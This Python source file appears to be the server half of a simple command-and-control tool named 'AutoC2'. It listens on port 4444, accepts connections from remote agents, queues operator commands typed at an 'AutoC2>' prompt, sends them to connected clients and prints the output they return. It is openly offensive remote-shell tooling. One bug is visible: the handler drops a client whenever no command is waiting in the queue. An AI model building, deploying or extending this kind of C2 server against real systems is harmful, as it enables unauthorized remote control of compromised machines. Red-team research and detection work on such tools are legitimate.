import socket
import threading
import queue
import readline

# Server IP and port configuration
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Queue to store commands for each client
command_queue = queue.Queue()

# Function to handle client connections
def handle_client(client_socket, client_address):
    print(f"[+] New connection from {client_address}")
    try:
        while True:
            # Check if there are commands in the queue
            if not command_queue.empty():
                # Get the next command from the queue
                command = command_queue.get()
                print(f"[+] Sending command to {client_address}: {command}")
                client_socket.sendall(command.encode())

                # Receive output from the client until the delimiter
                buffer = b''
                while b'ac2delim' not in buffer:
                    data = client_socket.recv(4096)
                    if not data:
                        break  # Exit if client closes the connection
                    buffer += data
                
                # Extract and display the output up to the delimiter
                output = buffer.partition(b'ac2delim')[0].decode()
                print(f"Output from {client_address}:\n{output}")
            else:
                break
    except Exception as e:
        print(f"[!] Error with client {client_address}: {e}")
    finally:
        print(f"[-] Connection closed for {client_address}")
        client_socket.close()

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen()
    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    try:
        while True:
            # Accept a new client
            client_socket, client_address = server_socket.accept()
            print(f"[+] Accepted connection from {client_address}")
            
            # Create a new thread to handle each client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down the server.")
    finally:
        server_socket.close()

def AutoC2_shell():
    # Custom shell to interact with agents by adding commands to the queue
    while True:
        command = input("AutoC2> ")
        
        # Blank command
        if not command.strip():
            continue
        
        # Exit the shell
        if command.lower() in ["exit", "quit"]:
            print("[*] Exiting AutoC2 shell.")
            break

        # Add command to the queue
        print(f"[+] Queuing command: {command}")
        command_queue.put(command + "\n")  # Add newline to match command format

def main():
    # Start server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Run the shell in the main thread
    try:
        AutoC2_shell()
    finally:
        print("[*] Server has been stopped.")

if __name__ == "__main__":
    main()
